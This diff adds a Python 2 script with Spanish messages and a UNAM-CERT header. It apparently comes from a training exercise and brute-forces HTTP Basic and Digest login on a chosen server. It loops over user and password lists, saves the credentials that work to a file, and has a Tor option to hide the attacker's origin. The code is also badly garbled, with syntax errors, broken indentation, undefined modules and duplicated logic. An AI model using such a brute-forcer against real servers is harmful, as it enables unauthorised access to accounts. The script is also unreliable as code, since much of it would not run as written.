@@ -1,0 +1,322 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#UNAM-CERT
+import sys
+import optparse
+import os.path
+from requests import get
+from requests.exceptions import ConnectionError
+from datetime import datetime
+from requests.auth import HTTPDigestAuth
+
+usuario = []
+passwords = []
+
+
+def printError(msg, exit = False):
+        sys.stderr.write('Error:\t%s\n' % msg)
+        if exit:
+            sys.exit(1)
+
+def addOptions():
+    parser = optparse.OptionParser()
+    parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
+    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
+    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
+    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
+    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
+    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
+    parser.add_option('-H', '--https', dest='https', default=None, action='store_true', help'El puerto https esta escuchando')
+    parser.add_option('-t', '--tor', dest='tor', action='store_true', default=None, help='tor')
+    opts,args = parser.parse_args()
+    return opts
+    
+def checkOptions(options):
+    if options.server is None:
+        printError('Debes especificar un servidor a atacar.', True)
+
+
+
+def reportResults():
+    pass
+
+
+def buildURL(server,port, protocol = 'http'):
+    url = '%s://%s:%s' % (protocol,server,port)
+    return url
+
+def abrirarch(user, password):
+	with open (user,'r') as user:
+		for line in user.readlines():
+			usuario.append(line[:-1])
+	with open (password, 'r') as password:
+		for l in password.readlines():
+			passwords.append(l[:-1])
+		return usuario, passwords
+		
+def makeRequestDigest(host, user, password):
+    try:
+        response = get(host, auth=HTTPDigestAuth(user,password))
+        if response.status_code == 200:
+            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
+            archivo=open('archivo.txt','w')
+            archivo.write(user+','+password)
+            archivo.close()
+            return True
+        else:
+            print 'NO FUNCIONO :c '
+            return False
+    except ConnectionError:
+        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
+
+
+def makeRequest(host, user, password):	
+    try:
+	response = get(host, auth=(user,password))
+	#print response
+	#print dir(response)
+	if response.status_code == 200:
+	    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
+	    archivo=open('archivo.txt', 'w')
+	    archivo.write(user+'.'+password)
+	    archivo.close()
+	    print 'Se escribi en el reporteó
+	else:
+	    print 'NO FUNCIONO :c '
+    except ConnectionError:
+        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
+
+
+if __name__ == '__main__':
+    try:
+	i=0
+        opts = addOptions() 
+        checkOptions(opts)
+	i = reportResults()
+	if i == 1:
+		print "Fecha de Ejecución:" str(datetime.now()) + "\n Puerto:" + opts.port + "\n IP: " + opts.server
+		opts.verbose=True
+	elif i == 2:
+		print "Se esta creando el reporte"
+		reporte=open(opts.report, 'w')
+		reporte.write("Fecha de Ejecución:" str(datetime.now()) + "\n Puerto:" + opts.port + "\n IP: " + opts.server
+	elif i == 3:
+		print "Fecha de Ejecución:" str(datetime.now()) + "\n Puerto:" + opts.port + "\n IP: " + opts.server
+		reporte=open(opts.report, 'w')
+		reporte.write("Fecha de Ejecución:" str(datetime.now()) + "\n Puerto:" + opts.port + "\n IP: " +
+	
+	if opts.https:
+       		 url = buildURL(opts.server, port = opts.port, protocol='https')
+	else
+		 url = buildURL(opts.server, port = opts.port)
+	abrirarch(opts.user, opts.password)  
+ 	for u in usuario:
+		for p in passwords:
+		        makeRequest(url, u, p)
+
+
+ if os.path.isfile(opts.user) and os.path.isfile(opts.password):
+            f1= open(opts.user,'r')
+            for line in f1.readlines():
+                usuario = line[:-1]
+                if opts.verbose:
+                   	 print usuario
+               		 f2= open(opts.password,'r')
+                	for lines in f2.readlines():
+                   		 password = lines[:-1]
+                    		if opts.verbose:
+                        	if opts.report and i==3:
+                         	   	 reporte.write('\n'+usuario+'\n\n')
+                           		 reporte.write(password+'\n')
+                           		 print "Contraseña: " + password
+                            	if makeRequest(url, usuario, password):
+                                	reporte.write('ENCONTRADO CON BASIC\n')
+                                	print 'ENCONTRADO CON BASIC\n'
+                            	else:
+                                	reporte.write('NO ENCONTRADO CON BASIC\n')
+                                	print 'NO ENCONTRADO CON BASIC\n'
+                           	 if makeRequestDigest(url, usuario, password):
+                               		 reporte.write('ENCONTRADO CON DIGEST\n')
+                              		  print 'ENCONTRADO CON DIGEST\n'
+                            	else:
+                               		 reporte.write('NO ENCONTRADO CON DIGEST\n')
+                               		 print 'NO ENCONTRADO CON DIGEST\n'
+                       		elif i!=2:
+                           		 print "Contraseña: " + password
+                           		 makeRequest(url, usuario, password)
+                           		 makeRequestDigest(url, usuario, password)
+                    		elif opts.report and i==2:
+                        		reporte.write('\n'+usuario+'\n\n')
+                      			  reporte.write(password+'\n')
+                      		if makeRequest(url, usuario, password):
+                            		reporte.write('ENCONTRADO CON BASIC\n')
+                       		 else:
+                            		reporte.write('NO ENCONTRADO CON BASIC\n')
+                       		 if makeRequestDigest(url, usuario, password):
+                          		  reporte.write('ENCONTRADO CON DIGEST\n')
+                      		  else:
+                          		  reporte.write('NO ENCONTRADO CON DIGEST\n')
+                  		  else:
+                   		     makeRequest(url, usuario, password)
+                       			 makeRequestDigest(url, usuario, password)
+               				 f2.close()
+          				  f1.close()
+        
+       				 elif os.path.isfile(opts.user)==False and os.path.isfile(opts.password)==False:
+          			  if opts.verbose:
+          			      if opts.report and i==3:
+            			        reporte.write('\n'+opts.user+'\n\n')
+                   			 reporte.write(opts.password+'\n\n')
+                  			  print opts.user
+                  			  print opts.password
+                  		  if makeRequest(url, opts.user, opts.password):
+                     		   reporte.write('ENCONTRADO CON BASIC\n')
+                    		    print 'ENCONTRADO CON BASIC\n'
+                   		 else:
+                     		   	reporte.write('NO ENCONTRADO CON BASIC\n')
+                       			 print 'NO ENCONTRADO CON BASIC\n'
+                    		if makeRequestDigest(url, opts.user, opts.password):
+                        		reporte.write('ENCONTRADO CON DIGEST\n')
+                       			 print 'ENCONTRADO CON DIGEST\n'
+                    		else:
+                       			 reporte.write('NO ENCONTRADO CON DIGEST\n')
+                       			 print 'NO ENCONTRADO CON DIGEST\n'
+                		elif i!=2:
+                    			print opts.user
+                   			 print opts.password
+                   		 makeRequest(url, opts.user, opts.password)
+                   		 makeRequestDigest(url, opts.user, opts.password)
+
+            elif opts.report and i==2:
+                reporte.write('\n'+opts.user+'\n\n')
+                reporte.write(opts.password+'\n\n')
+                if makeRequest(url, opts.user, opts.password):
+                    reporte.write('ENCONTRADO CON BASIC\n')
+                else:
+                    reporte.write('NO ENCONTRADO CON BASIC\n')
+                if makeRequestDigest(url, opts.user, opts.password):
+                    reporte.write('ENCONTRADO CON DIGEST\n')
+                else:
+                    reporte.write('NO ENCONTRADO CON DIGEST\n')
+            else:
+                makeRequest(url, opts.user, opts.password)
+                makeRequestDigest(url, opts.user, opts.password)
+       
+        elif os.path.isfile(opts.user) and os.path.isfile(opts.password)==False:
+            f1= open(opts.user,'r')
+            for line in f1.readlines():
+                usuario = line[:-1]
+               
+                if opts.verbose:
+                    if opts.report and i==3:
+                        reporte.write('\n'+usuario+'\n\n')
+                        reporte.write(opts.password+'\n\n')
+                        print usuario
+                        if makeRequest(url, usuario, opts.password):
+                            reporte.write('ENCONTRADO CON BASIC\n')
+                            print 'ENCONTRADO CON BASIC\n'
+                        else:
+                            reporte.write('NO ENCONTRADO CON BASIC\n')
+                            print 'NO ENCONTRADO CON BASIC\n'
+                        if makeRequestDigest(url, usuario, opts.password):
+                            reporte.write('ENCONTRADO CON DIGEST\n')
+                            print 'ENCONTRADO CON DIGEST\n'
+                        else:
+                            reporte.write('NO ENCONTRADO CON DIGEST\n')
+                            print 'NO ENCONTRADO CON DIGEST\n'
+                    elif i!=2:
+                        print usuario
+                        makeRequest(url, usuario, opts.password)
+                        makeRequestDigest(url, usuario, opts.password)
+                elif opts.report and i==2:
+                    reporte.write('\n'+usuario+'\n\n')
+                    reporte.write(opts.password+'\n\n')
+                    if makeRequest(url, usuario, opts.password):
+                        reporte.write('ENCONTRADO CON BASIC\n')
+                    else:
+                        reporte.write('NO ENCONTRADO CON BASIC\n')
+                    if makeRequestDigest(url, usuario, opts.password):
+                        reporte.write('ENCONTRADO CON DIGEST\n')
+                    else:
+                        reporte.write('NO ENCONTRADO CON DIGEST\n')
+                else:
+                    makeRequest(url, usuario, opts.password)
+                    makeRequestDigest(url, usuario, opts.password)
+
+            f1.close()
+         elif os.path.isfile(opts.user)==False and os.path.isfile(opts.password):
+            f2= open(opts.password,'r')
+            for lines in f2.readlines():
+                password = lines[:-1]
+            
+                if opts.verbose:
+                    if opts.report and i==3:
+                        reporte.write('\n'+opts.user+'\n\n')
+                        reporte.write(password+'\n')
+                        print "Contraseña: " + password
+                        if makeRequest(url, opts.user, password):
+                            reporte.write('ENCONTRADO CON BASIC\n')
+                            print 'ENCONTRADO CON BASIC\n'
+                        else:
+                            reporte.write('NO ENCONTRADO CON BASIC\n')
+                            print 'NO ENCONTRADO CON BASIC\n'
+                        if makeRequestDigest(url, opts.user, password):
+                            reporte.write('ENCONTRADO CON DIGEST\n')
+                            print 'ENCONTRADO CON DIGEST\n'
+                        else:
+                            reporte.write('NO ENCONTRADO CON DIGEST\n')
+                            print 'NO ENCONTRADO CON DIGEST\n'
+                    elif i!=2:
+                        print "Contraseña: " + password
+                        makeRequest(url, opts.user, password)
+                        makeRequestDigest(url, opts.user, password)
+                elif opts.report and i==2:
+                    reporte.write('\n'+opts.user+'\n\n')
+                    reporte.write(password+'\n\n')
+                    if makeRequest(url, opts.user, password):
+                        reporte.write('ENCONTRADO CON BASIC\n')
+                    else:
+                        reporte.write('NO ENCONTRADO CON BASIC\n')
+                    if makeRequestDigest(url, opts.user, password):
+                        reporte.write('ENCONTRADO CON DIGEST\n')
+                    else:
+                        reporte.write('NO ENCONTRADO CON DIGEST\n')
+                else:
+                    makeRequest(url, opts.user, password)
+                    makeRequestDigest(url, opts.user, password)
+
+            f2.close()
+
+ 	 if opts.tor:
+            ad=0
+          
+            if os.path.isfile(opts.user)==False and os.path.isfile(opts.password)==False:
+                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+                socket.socket = socks.socksocket 
+                val = urllib2.build_opener()
+                val.addheaders = [('User-Agent', 'Aline-Avalos')]
+                val.open('http://87.118.110.170')
+                makeRequest(url, opts.user, opts.password) 
+                print "tor"
+                ad+=1
+           
+            elif os.path.isfile(opts.user)==False and os.path.isfile(opts.password):
+                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+                socket.socket = socks.socksocket 
+                val = urllib2.build_opener()
+                val.addheaders = [('User-Agent', 'Aline Avalos')]
+                val.open('http://87.118.110.170')
+                f2= open(opts.password,'r')
+                for lines in f2.readlines():
+                    password = lines[:-1]
+                    makeRequest(url, opts.user, password)
+                
+	f2.close()
+
+
+        if opts.report and i in [2,3]:
+reporte.close()
+
+    except Exception as e:
+        printError('Ocurrio un error inesperado')
+        printError(e, True)
